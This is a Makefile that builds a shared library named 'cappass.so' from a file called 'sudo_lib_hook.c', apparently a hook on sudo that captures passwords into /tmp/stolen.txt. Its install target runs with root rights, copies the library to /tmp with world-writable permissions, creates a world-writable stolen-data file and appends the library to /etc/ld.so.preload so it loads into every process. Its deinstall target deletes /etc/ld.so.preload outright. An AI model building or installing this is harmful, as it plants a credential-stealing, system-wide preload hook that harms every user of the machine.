# Define the C compiler and flags
CC = gcc
CFLAGS = -Wall -fPIC -shared
LIBS = -ldl
RM = rm -f

all: cappass.so

cappass.so: sudo_lib_hook.c
	$(CC) $(CFLAGS) -o $@ $^

# Phony target for cleaning up generated files
.PHONY: clean
clean:
	$(RM) cappass.so
	$(RM) /tmp/stolen.txt

install: all
    ifneq ($(shell id -u), 0)
	sudo make $@
    else
	$(RM) /tmp/cappass.so /etc/ld.so.preload /tmp/stolen.txt
	cp cappass.so /tmp/cappass.so
	chmod a+rwx /tmp/cappass.so
	touch /tmp/stolen.txt
	chmod a+rwx /tmp/stolen.txt
	echo "/tmp/cappass.so" >> /etc/ld.so.preload
   endif

deinstall: all
    ifneq ($(shell id -u), 0)
	sudo make $@
    else
	$(RM) /tmp/cappass.so /etc/ld.so.preload /tmp/stolen.txt
    endif
